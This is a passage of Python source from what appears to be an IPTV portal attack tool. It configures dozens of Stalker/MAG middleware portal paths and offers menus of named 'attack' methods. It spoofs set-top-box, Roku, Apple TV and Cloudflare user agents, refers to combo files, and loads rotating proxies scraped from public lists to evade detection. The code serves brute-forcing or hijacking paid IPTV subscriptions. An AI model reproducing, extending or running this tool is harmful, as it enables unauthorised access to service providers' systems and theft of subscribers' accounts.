    if phhp == "36":
        clear()
        author = "magportal/portal.php"
        albstb2 = "/magportal➚⁽ᴺᴼᴿ⁾"
        albstb3 = "magportal.php⁽ᴺᴼᴿ⁾"
        pano = "/magportal"
        stbb = "/magportal"
        authorz = "atack"
    if phhp == "37":
        clear()
        author = "magaccess/portal.php"
        albstb2 = "/magaccess➚⁽ᴺᴼᴿ⁾"
        albstb3 = "magaccess.php⁽ᴺᴼᴿ⁾"
        pano = "/magaccess"
        stbb = "/magaccess"
        authorz = "atack"
    if phhp == "38":
        clear()
        author = "powerfull/portal.php"
        albstb2 = "/powerfull➚⁽ᴺᴼᴿ⁾"
        albstb3 = "powerfull.php⁽ᴺᴼᴿ⁾"
        pano = "/powerfull"
        stbb = "/powerfull"
        authorz = "atack"
    if phhp == "39":
        clear()
        author = "portalmega.php"
        albstb2 = "/portalmega➚⁽ˣᵁᴵ³⁾"
        albstb3 = "portalmega.php⁽ˣᵁᴵ³⁾"
        pano = "/portalmega"
        stbb = "/portalmega"
        authorz = "atack"
    if phhp == "40":
        clear()
        author = "portalmega/portal.php"
        albstb2 = "/portalmega/p➚⁽ᴺᴼᴿ⁾"
        albstb3 = "portalmega/p.php⁽ᴺᴼᴿ⁾"
        pano = "/portalmega"
        stbb = "/portalmega"
        authorz = "atack"
    if phhp == "41":
        clear()
        author = "portalmega/portalmega.php"
        albstb2 = "/portalmega/pm➚⁽ᴺᴼᴿ⁾"
        albstb3 = "portalmega.php⁽ᴺᴼᴿ⁾"
        pano = "/portalmega"
        stbb = "/portalmega"
        authorz = "atack"
    if phhp == "42":
        clear()
        author = "ministra/portal.php"
        authorc = "realblue"
        albstb2 = "/ministra➚⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾"
        albstb3 = "ministra.php⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾"
        pano = "/ministra"
        stbb = "/ministra"
        authorz = "atack"
    if phhp == "43":
        clear()
        author = "ministra/portal.php"
        albstb2 = "/ministra➚⁽ˣᵁᴵ³⁾"
        albstb3 = "ministra.php⁽ˣᵁᴵ³⁾"
        stbb = "/ministra/c/"
        pano = "/ministra"
        authorz = "atack"
    if phhp == "44":
        clear()
        author = "korisnici/server/load.php"
        albstb2 = "/korisnici➚⁽ˣᵁᴵ⁾"
        albstb3 = "/korisnici.php⁽ˣᵁᴵ⁾"
        stbb = "/korisnici/c/"
        pano = "/korisnici"
        authorz = "atack"
    if phhp == "45":
        clear()
        author = "ghandi_portal/server/load.php"
        albstb2 = "/ghandi➚⁽ᴺᴼᴿ⁾"
        albstb3 = "ghandi_portal.php⁽ᴺᴼᴿ⁾"
        stbb = "/ghandi_portal/c/"
        pano = "/ghandi_portal"
        authorz = "atack"
    if phhp == "46":
        clear()
        author = "blowportal/portal.php"
        albstb2 = "/blowportal➚⁽ᴺᴼᴿ⁾"
        albstb3 = "blowportal.php⁽ᴺᴼᴿ⁾"
        stbb = "/blowportal/c/"
        pano = "/blowportal"
        authorz = "atack"
    if phhp == "47":
        clear()
        author = "emu2/server/load.php"
        albstb2 = "/emu2➚⁽ᴺᴼᴿ⁾"
        albstb3 = "emu2/stalker.php⁽ᴺᴼᴿ⁾"
        stbb = "/emu2/c/"
        authorz = "atack"
    if phhp == "48":
        clear()
        author = "emu/server/load.php"
        albstb2 = "/emu➚⁽ᴺᴼᴿ⁾"
        albstb3 = "emu/stalker.php⁽ᴺᴼᴿ⁾"
        stbb = "/emu/c/"
        authorz = "atack"
    if phhp == "49":
        clear()
        author = "extraportal.php"
        albstb2 = "/extraportal➚⁽ˣᵁᴵ³⁾"
        albstb3 = "extraportal.php⁽ˣᵁᴵ³⁾"
        stbb = "/extraportal/c/"
        pano = "/extraportal"
        authorz = "atack"
    if phhp == "50":
        clear()
        author = "tek/server/load.php"
        albstb2 = "/tek➚⁽ᴺᴼᴿ⁾"
        albstb3 = "tek/stalker.php⁽ᴺᴼᴿ⁾"
        stbb = "/tek/c/"
        authorz = "atack"
    if phhp == "51":
        clear()
        author = "Link_OK/portal.php"
        albstb2 = "/Link_OK/p➚⁽ˣᵁᴵ⁾"
        albstb3 = "Link_OK.php⁽ˣᵁᴵ⁾"
        stbb = "/Link_OK/c/"
        pano = "/Link_OK"
        authorz = "atack"
    if phhp == "52":
        clear()
        author = "Link_OK.php"
        albstb2 = "/Link_OK➚⁽ˣᵁᴵ³⁾"
        albstb3 = "Link_OK.php⁽ˣᵁᴵ³⁾"
        stbb = "/Link_OK/c/"
        pano = "/Link_OK"
        authorz = "atack"
    if phhp == "53":
        clear()
        author = "bs.mag.portal.php"
        albstb2 = "/bs.mag➚⁽ᴺᴼᴿ⁾"
        albstb3 = "bs.mag.portal.php⁽ᴺᴼᴿ⁾"
        stbb = "/bs.mag.portal/c/"
        pano = "/bs.mag.portal"
        authorz = "atack"
    if phhp == "54":
        clear()
        author = "bStream/portal.php"
        albstb2 = "/bStream/p➚⁽ˣᵁᴵ⁾"
        albstb3 = "bStream.php⁽ˣᵁᴵ⁾"
        stbb = "/bStream/c/"
        pano = "/bStream"
        authorz = "atack"
    if phhp == "55":
        clear()
        author = "bStream/server/load.php"
        albstb2 = "/bStream/s➚⁽ˣᵁᴵ⁾"
        albstb3 = "bStream/stalker.php⁽ˣᵁᴵ⁾"
        stbb = "/bStream/c/"
        pano = "/bStream"
        authorz = "atack"
    if phhp == "56":
        clear()
        author = "bStream/bs.mag.portal.php"
        albstb2 = "/bStream/bs➚⁽ˣᵁᴵ⁾"
        albstb3 = "bStream/bs.php⁽ˣᵁᴵ⁾"
        stbb = "/bStream/c/"
        pano = "/bStream"
        authorz = "atack"
    if phhp == "57":
        clear()
        author = "delko/server/load.php"
        albstb2 = "/delko/s➚⁽ᴺᴼᴿ⁾"
        albstb3 = "delko/stalker.php⁽ᴺᴼᴿ⁾"
        stbb = "/delko/c/"
        pano = "/delko"
        authorz = "atack"
    if phhp == "58":
        clear()
        author = "delko/portal.php"
        albstb2 = "/delko/p➚⁽ᴺᴼᴿ⁾"
        albstb3 = "delko/portal.php⁽ᴺᴼᴿ⁾"
        stbb = "/delko/c/"
        pano = "/delko"
        authorz = "atack"
    if phhp == "59":
        clear()
        author = "stalke.php"
        albstb2 = "➚⁽ˣᵁᴵ³⁾"
        albstb3 = "stalker.php⁽ˣᵁᴵ³⁾"
        pano = "/stalke"
        authorz = "atack"
        agentx = "Mᴀɢ266-Sᴛᴀʟᴋᴇʀ:533"
        useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3"
    if phhp == "60":
        clear()
        author = "775GGbszy.php"
        albstb2 = "➚⁽ˢˢ⁾"
        albstb3 = "stalker77.php⁽ˢˢ⁾"
        authorz = "atack"
    if phhp == "61":
        clear()
        author = "/play/integration/stalker"
        albstb2 = "/p/i/s➚⁽ˣᵁᴵ³⁾"
        albstb3 = "p/i/stalker.php⁽ˣᵁᴵ³⁾"
        authorz = "atack"
    if phhp == "62":
        clear()
        author = "portal.php"
        authorc = "realblue"
        albstb2 = "➚⁽ᴿᵉᵃˡᴮˡᵘᵉ⁾"
        albstb3 = "realblue.php⁽ᴮˡᵘᵉ⁾"
if phhp == "99":
    author = str(phpdata)
    attack = "sᴛʙ⁵ᴀᴜᴛᴏ-ᴀᴛᴛᴀᴄᴋ"
    agentx = "sᴛʙ⁵ᴀᴜᴛᴏ-ᴀɢᴇɴᴛX"
    if "stalker_portal" in panel:
        authorc = "realblue"
    if "c/" in author:
        agentx = "sᴛʙ⁵ᴀᴜᴛᴏ-ᴀɢᴇɴᴛC⁵"
    albstb3 = "ᴀᴜᴛᴏᴍᴀᴛɪᴄ.ᴘʜᴘ⁽ˢᵀᴮ⁵⁾"
    albstb2 = "/ᴀᴜᴛᴏ➚⁽ˢᵀᴮ⁵⁾"
    authorz = "atack"
    useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02"
if ssx in panel:
    ss = ssx
else:
    ss = ss
print("\x1b[0m")
infophpx = ""
if not infophp == "":
    infophpx = (
        """
   [33mDᴇʙᴜɢɢɪɴɢ:[91m"""
        + str(infophp)
        + "\x1b[91m"
        + str(vrdata)
        + " \x1b[0m"
    )
if authorz == "atack":
    clear()
    print(Rimix)
    atack = input(
        """[0m    [1;40mChoose Attack Method! [0m

    [33mғᴏʀ ᴅᴇғᴀᴜʟᴛ ᴊᴜsᴛ ʜɪᴛ ⫸ ᴇɴᴛᴇʀ [0m

    0 [1;32m=⫸ [0m [33mSᴛʙMᴀx-SS-Aᴛᴛᴀᴄᴋ [0m
    1 [1;32m=⫸ [0m [33mSᴛʙPʀᴏ-SP-Aᴛᴛᴀᴄᴋ [0m
    2 [1;32m=⫸ [0m [33mUʟᴛʀᴀ-SP-Aᴛᴛᴀᴄᴋ [0m
    3 [1;32m=⫸ [0m [33mGᴏʟᴅ-SS-Aᴛᴛᴀᴄᴋ [0m
    4 [1;32m=⫸ [0m [33mCʟᴏᴜᴅ-SP-Aᴛᴛᴀᴄᴋ [0m
    5 [1;32m=⫸ [0m [33mGʜᴏsᴛ-SS-Aᴛᴛᴀᴄᴋ [0m
    6 [1;32m=⫸ [0m [33mAᴛᴏᴍ-RL-Aᴛᴛᴀᴄᴋ [0m
    7 [1;32m=⫸ [0m [33mSᴛᴀʟᴋᴇʀ-SS-Aᴛᴛᴀᴄᴋ [0m
    8 [1;32m=⫸ [0m [33mSᴛᴀʟᴋᴇʀ-XX-Aᴛᴛᴀᴄᴋ [0m
    9 [1;32m=⫸ [0m [33mSᴛᴀʟᴋᴇʀ-SN-Aᴛᴛᴀᴄᴋ [0m
   10 [1;32m=⫸ [0m [33mSᴛᴀʟᴋᴇʀ-ID-Aᴛᴛᴀᴄᴋ [0m
   11 [1;32m=⫸ [0m [33mSᴛᴀʟᴋᴇʀ-RB-Aᴛᴛᴀᴄᴋ [0m

   [40mAɴsᴡᴇʀ =[0m[31m[31m[31m """
    )
    if atack == "":
        clear()
        if phhp == "99":
            attack = "sᴛʙ⁵ᴀᴜᴛᴏ-ᴀᴛᴛᴀᴄᴋ"
        else:
            attack = "Sᴛʙ-Mᴀx-Aᴛᴛᴀᴄᴋ"
    if atack == "0":
        clear()
        authorc = "ultra"
        if "server/load.php" in author:
            authorc = "stalker_ss"
            attack = "SᴛʙMᴀx-ss-Aᴛᴛᴀᴄᴋ"
        else:
            attack = "SᴛʙMᴀx-ᴘᴘ-Aᴛᴛᴀᴄᴋ"
    if atack == "1":
        clear()
        authorc = "stbpro"
        if "server/load.php" in author:
            attack = "SᴛʙPʀᴏ-Aᴛᴛᴀᴄᴋ-S"
        else:
            attack = "SᴛʙPʀᴏ-Aᴛᴛᴀᴄᴋ-P"
    if atack == "2":
        clear()
        authorc = "ultra"
        if "server/load.php" in author:
            attack = "Uʟᴛʀᴀ-Aᴛᴛᴀᴄᴋ-S"
        else:
            attack = "Uʟᴛʀᴀ-Aᴛᴛᴀᴄᴋ-P"
    if atack == "3":
        clear()
        authorc = "xgold"
        if "server/load.php" in author:
            attack = "Gᴏʟᴅ-Aᴛᴛᴀᴄᴋ-S"
        else:
            attack = "Gᴏʟᴅ-Aᴛᴛᴀᴄᴋ-P"
    if atack == "4":
        clear()
        agent = "22"
        authorc = "cloudflarex"
        albstb3 = "automatic.php⁽ᶜˡᵒᵘᵈ⁾"
        useragent = "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/534.34"
        if "server/load.php" in author:
            attack = "CʟᴏᴜᴅFʟᴀʀᴇ-PᴀsS"
        else:
            attack = "CʟᴏᴜᴅFʟᴀʀᴇ-Pᴀss"
    if atack == "5":
        clear()
        if author == "stalker_portal/server/load.php":
            authorc = "stalker_ss"
            attack = "Gʜᴏsᴛ-Aᴛᴛᴀᴄᴋ-SS"
        if author == "server/load.php":
            authorc = "ultra"
            attack = "Gʜᴏsᴛ-Aᴛᴛᴀᴄᴋ-S"
        else:
            authorc = "stbpro"
            attack = "Gʜᴏsᴛ-Aᴛᴛᴀᴄᴋ-P"
    if atack == "6":
        clear()
        authorc == "realblue"
        if "server/load.php" in author:
            attack = "Aᴛᴏᴍ-Aᴛᴛᴀᴄᴋ-S"
        else:
            attack = "Aᴛᴏᴍ-Aᴛᴛᴀᴄᴋ-P"
        useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02"
    if atack == "7":
        clear()
        authorc = "ultra"
        if "server/load.php" in author:
            authorc = "stalker_ss"
            attack = "Sᴛᴀʟᴋᴇʀ-SS-Aᴛᴛᴀᴄᴋ"
        else:
            attack = "Pᴏʀᴛᴀʟ-SS-Aᴛᴛᴀᴄᴋ"
    if atack == "8":
        clear()
        if "server/load.php" in author:
            authorc = "stalker"
            attack = "Sᴛᴀʟᴋᴇʀ-XX-Aᴛᴛᴀᴄᴋ"
        else:
            attack = "Host is not a Stalker!"
    if atack == "9":
        clear()
        if "server/load.php" in author:
            authorc = "stalker_portal"
            attack = "Sᴛᴀʟᴋᴇʀ-SN-Aᴛᴛᴀᴄᴋ"
        else:
            attack = "Host is not a Stalker!"
    if atack == "10":
        clear()
        if "server/load.php" in author:
            authorc = "stalker_portal_1"
            attack = "Sᴛᴀʟᴋᴇʀ-ID-Aᴛᴛᴀᴄᴋ"
        else:
            attack = "Host is not a Stalker!"
    if atack == "11":
        clear()
        if "server/load.php" in author:
            authorc = "stalker_portal_2"
            attack = "Sᴛᴀʟᴋᴇʀ-RB-Aᴛᴛᴀᴄᴋ"
        else:
            attack = "Host is not a Stalker!"
print("\x1b[0m")
if useragent == "":
    clear()
    print(Rimix)
    agent = input(
        """[0m    [1;40mChoose Agent Emulating! [0m

    [33mᴅᴇғᴀᴜʟᴛ ᴀɢᴇɴᴛ = 2 [0m

    0 [1;32m=⫸ [0m [33mᴄᴜsᴛᴏᴍ xᴀɢᴇɴᴛ [0m
    1 [1;32m=⫸ [0m [33mᴜʟᴛʀᴀ ᴍᴀᴛʀɪx [0m
    2 [1;32m=⫸ [0m [33mɴɪɴᴊᴀ xᴜʟᴛʀᴀ [0m
    3 [1;32m=⫸ [0m [33mʙᴏx ʀᴏᴋᴜ:ɢᴏʟᴅ [0m
    4 [1;32m=⫸ [0m [33mʙᴏx ʀᴏᴋᴜ:ᴜʟᴛʀᴀ [0m
    5 [1;32m=⫸ [0m [33mɢʟᴇ ᴀᴅᴛʙᴏx [0m
    6 [1;32m=⫸ [0m [33mɢʟᴇ ɴᴇxʙᴏx [0m
    7 [1;32m=⫸ [0m [33mᴍᴀɢ4:1812 [0m
    8 [1;32m=⫸ [0m [33mᴍᴀɢ4:2721 [0m
    9 [1;32m=⫸ [0m [33mᴍᴀɢ6:ᴀᴜᴛᴏ [0m
   10 [1;32m=⫸ [0m [33mᴍᴀɢ2:250 [0m
   11 [1;32m=⫸ [0m [33mᴍᴀɢ2:ᴀᴜᴛᴏ [0m
   12 [1;32m=⫸ [0m [33mᴍᴀɢ4:ᴀᴜᴛᴏ [0m
   13 [1;32m=⫸ [0m [33mᴍᴀɢ4:ᴀᴜᴛᴏ [0m
   14 [1;32m=⫸ [0m [33mᴀᴍᴀ4ᴋ ғɪʀᴇ [0m
   15 [1;32m=⫸ [0m [33mᴀᴘᴘʟᴇ 5ᴛʜ 4ᴋ [0m
   16 [1;32m=⫸ [0m [33mᴀᴘᴘʟᴇ 6ᴛʜ 4ᴋ [0m
   17 [1;32m=⫸ [0m [33mʙᴏx ᴄʜʀᴏᴍᴇ31 [0m
   18 [1;32m=⫸ [0m [33mʙᴏx sᴛᴀᴛ2.26 [0m
   19 [1;32m=⫸ [0m [33mʙᴏx ᴠɪᴛᴀ3.61 [0m
   20 [1;32m=⫸ [0m [33mxʙᴏx sᴇʀ2023 [0m
   21 [1;32m=⫸ [0m [33mᴍᴏᴢ ʜᴛᴛᴘs64 [0m
   22 [1;32m=⫸ [0m [33mᴄʟᴏᴜᴅғʟᴀʀᴇ-ɢᴇɴ [0m
   23 [1;32m=⫸ [0m [33mᴄʜʀᴏᴍᴇ ᴏᴋʜᴛᴛᴘx [0m

   [40mAɴsᴡᴇʀ =[0m[31m[31m[31m """
    )
    if agent == "":
        clear()
        useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02"
        agentx = "Cᴜsᴛᴏᴍ-Aɢᴇɴᴛ-Sᴛʙ5"
    if agent == "0":
        useragent = input(" Write Custom Agent = \x1b[0m")
        agentx = "Cᴜsᴛᴏᴍ-xAɢᴇɴᴛ"
        print(" " + useragent + "\n")
    if agent == "1":
        clear()
        useragent = "Roku/DVP-9.10 (559.10E04111A)"
        agentx = "Uʟᴛʀᴀ-Mᴀᴛʀɪx"
    if agent == "2":
        clear()
        useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02"
        agentx = "Nɪɴᴊᴀ-Xᴜʟᴛʀᴀ"
    if agent == "3":
        clear()
        useragent = "Roku/DVP-9.10 (559.10E04111A)"
        agentx = "BᴏxRᴏᴋᴜ:Gᴏʟᴅ"
    if agent == "4":
        clear()
        useragent = "Roku4640X/DVP-7.70 (297.70E04154A)"
        agentx = "BᴏxRᴏᴋᴜ:Uʟᴛʀᴀ"
    if agent == "5":
        clear()
        useragent = "Dalvik/2.1.0 (Linux; U; Android 9; ADT-2 Build/PTT5.181126.002)"
        agentx = "Gʟᴇ-ᴀᴅᴛBᴏx"
    if agent == "6":
        clear()
        useragent = "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)"
        agentx = "Gʟᴇ-ɴᴇxBᴏx"
    if agent == "7":
        clear()
        useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3"
        agentx = "Mᴀɢ4:1812"
    if agent == "8":
        clear()
        useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        agentx = "Mᴀɢ4:2721"
    if agent == "9":
        clear()
        useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 6 rev: c8a6f17 Mobile Safari/533.3"
        agentx = "Mᴀɢ6:Aᴜᴛᴏ"
    if agent == "10":
        clear()
        useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
        agentx = "Mᴀɢ2:250"
    if agent == "11":
        clear()
        useragent = (
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: "
            + str(random.randint(999, 9999))
            + " Mobile Safari/533.3"
        )
        agentx = "Mᴀɢ2:Aᴜᴛᴏ"
    if agent == "12":
        clear()
        useragent = (
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: "
            + str(random.randint(999, 9999))
            + " Mobile Safari/533.3"
        )
        agentx = "Mᴀɢ4:Aᴜᴛᴏ"
    if agent == "13":
        clear()
        useragent = (
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG350 stbapp ver: 4 rev: "
            + str(random.randint(999, 9999))
            + " Mobile Safari/533.3"
        )
        agentx = "Mᴀɢ3:Aᴜᴛᴏ"
    if agent == "14":
        clear()
        useragent = "Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36"
        agentx = "Aᴍᴀ4ᴋ-Fɪʀᴇ"
    if agent == "15":
        clear()
        useragent = "AppleTV6,2/11.1"
        agentx = "Aᴘᴘʟᴇ-5ᴛʜ-4ᴋ"
    if agent == "16":
        clear()
        useragent = "AppleTV11,1/11.1"
        agentx = "Aᴘᴘʟᴇ-6ᴛʜ-4ᴋ"
    if agent == "17":
        clear()
        useragent = "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36"
        agentx = "Bᴏx-Cʜʀᴏᴍᴇ31"
    if agent == "18":
        clear()
        useragent = "Mozilla/5.0 (PlayStation; PlayStation 5/2.26) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
        agentx = "Bᴏx-Sᴛᴀᴛ2.26"
    if agent == "19":
        clear()
        useragent = (
            "Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2"
        )
        agentx = "Bᴏx-Vɪᴛᴀ3.61"
    if agent == "20":
        clear()
        useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02"
        agentx = "xBᴏx-Sᴇʀ2023"
    if agent == "21":
        clear()
        useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
        agentx = "Mᴏᴢ-ʜᴛᴛᴘs64"
    if agent == "22":
        clear()
        useragent = "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/534.34"
        authorc = "cloudflarex"
        agentx = "CʟᴏᴜᴅFʟᴀʀᴇ-Gᴇɴ"
    if agent == "23":
        clear()
        useragent = "okhttp/4.7.1"
        agentx = "Cʜʀᴏᴍᴇ-ᴏᴋʜᴛᴛᴘx"
print("\x1b[0m")
clear()
print(Rimix)

import pycountry, flag

ProxiesON = ""
pdata = ""
filea = ""
mtype = ""
listf = ""
proxy_ = ""
prosay = 1
protocol = 0
selectprox = 0
statusproxy = 0
rotationx = []
rotationlen = 0
proxygood = []
proxygoodlen = 0
proxysbad = []
proxysbadlen = 0
checkproxyend = 0
channels = "0"
channels = input(
    """[1;40m    COUNTRIES, VOD AND SERIES [0m
   
    [33mᴅᴇғᴀᴜʟᴛ ᴄᴀᴛᴇɢᴏʀʏ = 3 [0m
    [36m
    0 - STB (No Categories) 
    1 - Live Countries (LIVE) 
    2 - All Categories (LIVE+VOD+SER)

[31m    Aɴsᴡᴇʀ = [0m[0m[0m"""
)
if channels == "":
    channels = "2"
clear()
print(Rimi)
proxi = input(
    """[1;40m   Do you want to use Proxy?! [0m
   
   [33mᴅᴇғᴀᴜʟᴛ ɪs = 2 [0m
[36m
   1 - Yes
   2 - No
[0m
[31m   Aɴsᴡᴇʀ = [0m[0m[0m"""
)
if not proxi == "1":
    proxi = "2"
    proxia = ""
if proxi == "1":
    clear()
    print(Rimi)
    proxia = input(
        """[1;40m   Choose a Proxy Method?! [0m
   
   [33mᴅᴇғᴀᴜʟᴛ ɪs = 1 [0m
[36m
   1 = STB5 ONLINE HQ Proxies
   
   2 = Proxies from file .txt
[0m
[31m   Aɴsᴡᴇʀ = [0m[0m[0m"""
    )
    if not proxia == "2":
        proxia = "1"
if proxi == "1" and proxia == "1":
    clear()
    print(Rimiw)
    typeproxies = input(
        """[1;40m   STBv5 ONLINE HIGH Proxies! [0m
   [33m
   ᴅᴇғᴀᴜʟᴛ = 1 = ᴇɴᴛᴇʀ [0m
   [36m
   1 = HTTP/s (Oɴʟɪɴᴇ)-[2000+] 
   2 = HTTP/s (Oɴʟɪɴᴇ)-[5000+] 
   3 = HTTP/s (Oɴʟɪɴᴇ)-[9999+] 
   
   4 = Sᴏᴄᴋs4 (Oɴʟɪɴᴇ)-[3000+] 
   5 = Sᴏᴄᴋs4 (Oɴʟɪɴᴇ)-[6000+] 
   6 = Sᴏᴄᴋs4 (Oɴʟɪɴᴇ)-[9999+] 
   
   7 = Sᴏᴄᴋs5 (Oɴʟɪɴᴇ)-[1000+] 
   8 = Sᴏᴄᴋs5 (Oɴʟɪɴᴇ)-[3000+] 
   9 = Sᴏᴄᴋs5 (Oɴʟɪɴᴇ)-[5000+] 
   [0m
[31m   Pʀᴏxʏ Tʏᴘᴇ = [0m"""
    )
    if typeproxies == "":
        typeproxies = "1"
if proxi == "1" and proxia == "2":
    clear()
    print(Rimic)
    say = 0
    dsy = ""
    dirp = rootDir + "/ALBSTB/Proxy/"
    if not os.path.exists(dirp):
        os.mkdir(dirp)
    for files in os.listdir(dirp):
        if files.endswith(".txt"):
            say = say + 1
            dsy = (
                dsy
                + "   \x1b[1;31m"
                + str(say)
                + "\x1b[0m\x1b[1;32m = \x1b[0m\x1b[36m"
                + files
                + "\x1b[36m\n"
            )
    print(
        """   [1;40mChoose your proxys from the list below! [0m

"""
        + dsy
        + "\n   \x1b[33mFound "
        + str(say)
        + " .txt Combo files. \x1b[0m"
    )
    proxyfile = str(
        input(
            """
[31m   Aɴsᴡᴇʀ = [0m"""
        )
    )
    if proxyfile == "" or proxyfile == "0":
        print(
            """
   Incorrect proxy file selection...!"""
        )
        quit()
    say = 0
    for files in os.listdir(dirp):
        if files.endswith(".txt"):
            say = say + 1
            if proxyfile == str(say):
                pdata = dirp + files
    say = 0
    ProxFile = pdata.replace(rootDir + "/ALBSTB/Proxy/", "")
    print(
        """
[33m   Loading Proxy... [0m
   [+] """
        + str(ProxFile)
    )
    time.sleep(0.1)
    clear()
    print(Rimi)
    listf = open(pdata).readlines()
    proxyf = [i for i in listf if i]
    proxyslen = len(proxyf)
    typeproxy = input(
        """[1;40m   What is the Proxy Type? [0m
   
[33m   ["""
        + str(proxyslen)
        + "] "
        + str(ProxFile)
        + """ [0m
   [36m
   1 = Pʀᴏ5 - Vᴀɴɪsʜ (Sʀᴠ:Usᴇʀ:Pᴀss) 
   2 = PʀᴏH - HTTP/S (Sʀᴠ:Usᴇʀ:Pᴀss) 
   3 = Fʀᴇᴇ - HTTP/S (IP:Pᴏʀᴛ) 
   4 = Fʀᴇᴇ - Sᴏᴄᴋs4 (IP:Pᴏʀᴛ) 
   5 = Fʀᴇᴇ - Sᴏᴄᴋs5 (IP:Pᴏʀᴛ) 
   6 = Fʀᴇᴇ - IPV6/X (IP:Pᴏʀᴛ) 
   [0m
[31m   Pʀᴏxʏ Tʏᴘᴇ = [0m"""
    )
    if typeproxy == "1":
        clear()
        protocol = 1
        mtype = "IPVanish"
    elif typeproxy == "2":
        clear()
        protocol = 2
        mtype = "HTTP/Pro"
    elif typeproxy == "3":
        clear()
        protocol = 3
        mtype = "HTTP/IPs"
    elif typeproxy == "4":
        clear()
        protocol = 4
        mtype = "Socks4"
    elif typeproxy == "5":
        clear()
        protocol = 5
        mtype = "Socks5"
    elif typeproxy == "6":
        clear()
        protocol = 6
        mtype = "IPV6/Pro"
    else:
        print(
            """
  ERROR: Incorrect proxy type!"""
        )
        quit()
if proxia == "1":
    headersx = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
    }
    FileHP = rootDir + "/ALBSTB/Proxy/HTTP_OnlineSTB5.txt"
    FileS4 = rootDir + "/ALBSTB/Proxy/SOCKS4_OnlineSTB5.txt"
    FileS5 = rootDir + "/ALBSTB/Proxy/SOCKS5_OnlineSTB5.txt"
    try:
        if typeproxies == "1" or typeproxies == "2" or typeproxies == "3":
            protocol = 3
            mtype = "HTTP/IPs"
            fdata = "Automatic-Onine-HTTP/s"
            print(f"\n\x1b[33m   Please wait a few seconds!\n    Loading Proxy...{mtype}  \x1b[0m")
            hturl1 = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=elite"
            htp1 = requests.get(hturl1, headers=headersx)
            print("DDDDDDDDDDDDDDDDDD")
            print(htp1)
            r1 = htp1.text
            e1 = open(FileHP, "w+", encoding="utf-8-sig")
            vu1 = e1.write(r1 + "\n")
            e1.close()
            hturl2 = "https://www.proxy-list.download/api/v1/get?type=http&anon=elite"
            htp2 = requests.get(hturl2, headers=headersx)
            r2 = htp2.text
            e2 = open(FileHP, "a+")
            vu2 = e2.write(r2 + "\n")
            e2.close()
            hturl3 = "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt"
            htp3 = requests.get(hturl3, headers=headersx)
            r3 = htp3.text
            e3 = open(FileHP, "a+")
            vu3 = e3.write(r3 + "\n")
            e3.close()
            hturl4 = "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"
            htp4 = requests.get(hturl4, headers=headersx)
            r4 = htp4.text
            e4 = open(FileHP, "a+")
            vu4 = e4.write(r4 + "\n")
            e4.close()
            hturl5 = "https://raw.githubusercontent.com//sunny9577/proxy-scraper/master/proxies.txt"
            htp5 = requests.get(hturl5, headers=headersx)
            r5 = htp5.text
            e5 = open(FileHP, "a+")
            vu5 = e5.write(r5 + "\n")
            e5.close()
